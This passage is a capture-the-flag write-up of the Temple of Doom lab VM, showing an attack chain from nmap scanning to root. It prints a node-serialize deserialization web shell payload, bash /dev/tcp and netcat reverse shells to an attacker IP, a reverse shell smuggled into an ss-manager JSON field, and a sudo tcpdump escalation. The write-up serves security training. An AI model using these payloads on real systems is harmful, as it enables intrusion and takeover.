@@ -1,0 +1,274 @@
+I"P<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>A ping scan on the local network reveals the target machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/temple-of-doom<span class="nv">$ </span>hdiscovery.py <span class="nt">-t</span> 192.168.179.0/24
+192.168.179.177 is alive
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>Full TCP port scan with nmap detected two open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/temple-of-doom<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> <span class="nt">-T4</span> 192.168.179.177 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT    STATE SERVICE
+22/tcp  open  ssh
+666/tcp open  doom
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>Version detection and script scanning was performed with nmap to discover more information about open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/temple-of-doom<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,666 192.168.179.177 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea <span class="o">(</span>RSA<span class="o">)</span>
+|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 <span class="o">(</span>ED25519<span class="o">)</span>
+666/tcp open  http    Node.js Express framework
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=utf-8).
+...
+</span></code></pre></div></div>
+
+<h3 id="enumeration-on-port-666">Enumeration on port 666</h3>
+
+<p>Browsing the web page an error message was detected.</p>
+
+<p><img src="/assets/images/templeofdoom/screenshot-1.png" alt="" /></p>
+
+<p><img src="/assets/images/templeofdoom/screenshot-2.png" alt="" /></p>
+
+<p>Researching a little bit about the error was possible to detect a remote code execution vulnerability for this version of node js.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/temple-of-doom<span class="nv">$ </span>searchsploit node serialize
+<span class="nt">---------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
+ Exploit Title                                                 |  Path
+<span class="nt">---------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
+Node.JS - <span class="s1">'node-serialize'</span> Remote Code Execution               | linux/remote/45265.js
+Node.JS - <span class="s1">'node-serialize'</span> Remote Code Execution <span class="o">(</span>2<span class="o">)</span>           | nodejs/webapps/49552.py
+Node.JS - <span class="s1">'node-serialize'</span> Remote Code Execution <span class="o">(</span>3<span class="o">)</span>           | nodejs/webapps/50036.js
+<span class="nt">---------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="insecure-deserealization">Insecure Deserealization</h3>
+
+<p>This occurs when untrusted input is passed into unserialize() function in node-serialize module can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE), more information on this topic you can find it <a href="https://medium.com/@chaudharyaditya/insecure-deserialization-3035c6b5766e">here</a>.</p>
+
+<p>We copy this exploit to our current directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/temple-of-doom<span class="nv">$ </span>searchsploit <span class="nt">-m</span> nodejs/webapps/50036.js
+</code></pre></div></div>
+
+<p>If we analyze the exploit code, we need to inject our payload into the cookie value to trigger the execution of commands.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/temple-of-doom<span class="nv">$ </span><span class="nb">cat </span>50036.js 
+<span class="c"># Exploit Title: Node.JS - 'node-serialize' Remote Code Execution (3)</span>
+<span class="c"># Date: 17.06.2021</span>
+<span class="c"># Exploit Author: Beren Kuday GORUN</span>
+<span class="c"># Vendor Homepage: https://github.com/luin/serialize</span>
+<span class="c"># Software Link: https://github.com/luin/serialize</span>
+<span class="c"># Version: 0.0.4</span>
+<span class="c"># Tested on: Windows &amp; Ubuntu</span>
+<span class="c"># CVE : 2017-5941</span>
+
+var serialize <span class="o">=</span> require<span class="o">(</span><span class="s1">'node-serialize'</span><span class="o">)</span><span class="p">;</span>
+var payload <span class="o">=</span> <span class="o">{</span>
+    <span class="s2">"webShell"</span> : <span class="s2">"_</span><span class="nv">$$</span><span class="s2">ND_FUNC</span><span class="nv">$$</span><span class="s2">_function(){const http = require('http'); const url = require('url'); const ps  = require('child_process'); http.createServer(function (req, res) { var queryObject = url.parse(req.url,true).query; var cmd = queryObject['cmd']; try { ps.exec(cmd, function(error, stdout, stderr) { res.end(stdout); }); } catch (error) { return; }}).listen(443); }()"</span>
+    <span class="o">}</span>
+serialize.unserialize<span class="o">(</span>serialize.serialize<span class="o">(</span>payload<span class="o">))</span>
+
+/<span class="k">*</span>
+<span class="c"># after being exploited</span>
+
+┌──<span class="o">(</span>root@kali<span class="o">)</span>-[/home/kali]
+└─# curl http://10.0.2.4:443?cmd<span class="o">=</span><span class="nb">whoami
+</span>nodeadmin
+</code></pre></div></div>
+
+<p>We can replicate the exploitation process manually, first we intercept the request with burp, right click and <strong>Send to Repeater</strong>.</p>
+
+<p><img src="/assets/images/templeofdoom/screenshot-3.png" alt="" /></p>
+
+<p>In the repeater tab we click <strong>Send</strong> to have a baseline of the response length, then we copy the cookie value for take it to the burp <strong>Decoder</strong>.</p>
+
+<p><img src="/assets/images/templeofdoom/screenshot-4.png" alt="" /></p>
+
+<p>The cookie set by the server is a base64 encoded JSON object, we need to decode it to URL first and then to base64.</p>
+
+<p><img src="/assets/images/templeofdoom/screenshot-5.png" alt="" /></p>
+
+<p>We copy the payload from the script and base64 encode it.</p>
+
+<p><img src="/assets/images/templeofdoom/screenshot-6.png" alt="" /></p>
+
+<p>In the <strong>Repeater</strong> tab, we paste the resulting string in base64 as the cookie value, then click <strong>Send</strong>, this webshell listens on port 443 waiting for incoming commands via cmd parameter.</p>
+
+<p><img src="/assets/images/templeofdoom/screenshot-7.png" alt="" /></p>
+
+<p>Using curl we can run commands through the cmd parameter.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/temple-of-doom<span class="nv">$ </span>curl http://192.168.179.177:443?cmd<span class="o">=</span><span class="nb">id 
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>nodeadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nodeadmin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>nodeadmin<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Then to get a reverse shell we need to set up a netcat listener in this case on port 443 and then execute the following curl request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/temple-of-doom<span class="nv">$ </span>curl http://192.168.179.177:443?cmd<span class="o">=</span><span class="si">$(</span>urlencode <span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span><span class="si">)</span>
+</code></pre></div></div>
+
+<p>We have a reverse shell with nodeadmin user privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/temple-of-doom<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.177] 38956
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>820<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+<span class="o">[</span>nodeadmin@localhost ~]<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+<span class="o">[</span>nodeadmin@localhost ~]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>By listing the procesess <strong>ss-manager</strong> is running as user fireman, googling I found that it is a controller for multi-user management and traffic statistics, also this version is vulnerable to command execution, the exploit can be downloaded <a href="https://www.exploit-db.com/exploits/43006">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>nodeadmin@localhost ~]<span class="nv">$ </span>ps aux | <span class="nb">grep </span>fireman
+ps aux | <span class="nb">grep </span>fireman
+root       812  0.0  0.8 301464  4420 ?        S    23:41   0:00 su fireman <span class="nt">-c</span> /usr/local/bin/ss-manager
+fireman    829  0.0  0.7  37060  3876 ?        Ss   23:41   0:00 /usr/local/bin/ss-manager
+nodeadm+  1042  0.0  0.2 213788  1044 ?        S    23:45   0:00 <span class="nb">grep</span> <span class="nt">--color</span><span class="o">=</span>auto fireman
+</code></pre></div></div>
+
+<p>According to the specifications of the exploit, this must be run under the UDP port 8833, by listing the servicess we can verify that it is running on the specified port.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>nodeadmin@localhost ~]<span class="nv">$ </span>ss <span class="nt">-ntlu</span>
+ss <span class="nt">-ntlu</span>
+Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port  
+...
+udp    UNCONN   0        0               127.0.0.1:8839           0.0.0.0:<span class="k">*</span>     
+...
+</code></pre></div></div>
+
+<p>On the attacking machine we start a netcat listener on port 1337, then on the victim machine we connect to UDP port 8839 and we run the following command to get a shell from the target machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>nodeadmin@localhost ~]<span class="nv">$ </span>nc <span class="nt">-v</span> <span class="nt">-u</span> 127.0.0.1 8839
+nc <span class="nt">-v</span> <span class="nt">-u</span> 127.0.0.1 8839
+Ncat: Version 7.60 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Connected to 127.0.0.1:8839.
+add: <span class="o">{</span><span class="s2">"server_port"</span>:8003, <span class="s2">"password"</span>:<span class="s2">"test"</span>, <span class="s2">"method"</span>:<span class="s2">"||bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.179.1/1337 0&gt;&amp;1'||"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>Now, we have a shell as user fireman.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/temple-of-doom<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.1] 52707
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>848<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+<span class="o">[</span>fireman@localhost root]<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>fireman<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>fireman<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>fireman<span class="o">)</span>
+<span class="o">[</span>fireman@localhost root]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>This user has enabled run some binaries with sudo permissions, we will abuse tcpdump to escalate to root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>fireman@localhost root]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>fireman on localhost:
+    <span class="o">!</span>visiblepw, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
+    LS_COLORS"</span>, env_keep+<span class="o">=</span><span class="s2">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
+    LC_CTYPE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
+    LC_TELEPHONE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY"</span>,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User fireman may run the following commands on localhost:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /sbin/iptables
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/nmcli
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/tcpdump
+<span class="o">[</span>fireman@localhost root]<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>An awesome guide how to exploit this you can find it <a href="https://gtfobins.github.io/gtfobins/tcpdump/#sudo">here</a>.</p>
+
+<p>First we write a reverse shell into a file and give it execution permissions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>fireman@localhost root]<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'nc 192.168.179.1 8081 -e /bin/bash'</span> <span class="o">&gt;</span> /tmp/r00t
+&lt;ho <span class="s1">'nc 192.168.179.1 8081 -e /bin/bash'</span> <span class="o">&gt;</span> /tmp/r00t
+<span class="o">[</span>fireman@localhost root]<span class="nv">$ </span><span class="nb">chmod</span> +x /tmp/r00t
+<span class="nb">chmod</span> +x /tmp/r00t
+</code></pre></div></div>
+
+<p>Then, we set up a netcat listener and run the following command to get a reverse shell as user root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>fireman@localhost root]<span class="nv">$ </span><span class="nb">sudo</span> /usr/sbin/tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> eth0 <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /tmp/r00t <span class="nt">-Z</span> root
+&lt;<span class="nt">-i</span> eth0 <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /tmp/r00t <span class="nt">-Z</span> root
+tcpdump: listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+6 packets received by filter
+0 packets dropped by kernel
+<span class="o">[</span>fireman@localhost root]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>As we can see now we are root and we can read the root flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/temple-of-doom<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 8081  
+listening on <span class="o">[</span>any] 8081 ...         
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.1] 33895
+script <span class="nt">-qc</span> /bin/bash /dev/null                        
+<span class="o">[</span>root@localhost ~]#
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@localhost ~]# <span class="nb">ls
+ls
+</span>flag.txt
+<span class="o">[</span>root@localhost ~]# <span class="nb">cat </span>flag.txt
+<span class="nb">cat </span>flag.txt
+<span class="o">[</span>+] You<span class="s1">'re a soldier.
+[+] One of the best that the world could set against
+[+] the demonic invasion.
+
++-----------------------------------------------------------------------------+
+| |       |\                                           -~ /     \  /          |
+|~~__     | \                                         | \/       /\          /|
+|    --   |  \                                        | / \    /    \     /   |
+|      |~_|   \                                   \___|/    \/         /      |
+|--__  |   -- |\________________________________/~~\~~|    /  \     /     \   |
+|   |~~--__  |~_|____|____|____|____|____|____|/ /  \/|\ /      \/          \/|
+|   |      |~--_|__|____|____|____|____|____|_/ /|    |/ \    /   \       /   |
+|___|______|__|_||____|____|____|____|____|__[]/_|----|    \/       \  /      |
+|  \mmmm :   | _|___|____|____|____|____|____|___|  /\|   /  \      /  \      |
+|      B :_--~~ |_|____|____|____|____|____|____|  |  |\/      \ /        \   |
+|  __--P :  |  /                                /  /  | \     /  \          /\|
+|~~  |   :  | /                                 ~~~   |  \  /      \      /   |
+|    |      |/                        .-.             |  /\          \  /     |
+|    |      /                        |   |            |/   \          /\      |
+|    |     /                        |     |            -_   \       /    \    |
++-----------------------------------------------------------------------------+
+|          |  /|  |   |  2  3  4  | /~~~~~\ |       /|    |_| ....  ......... |
+|          |  ~|~ | % |           | | ~J~ | |       ~|~ % |_| ....  ......... |
+|   AMMO   |  HEALTH  |  5  6  7  |  \===/  |    ARMOR    |#| ....  ......... |
++-----------------------------------------------------------------------------+
+
+                FLAG: kre0cu4jl4rzjicpo1i7z5l1
+
+[+] Congratulations on completing this VM &amp; I hope you enjoyed my first boot2root.
+
+[+] You can follow me on twitter: @0katz
+
+[+] Thanks to the homie: @Pink_P4nther
+[root@localhost ~]#
+</span></code></pre></div></div>
+:ET
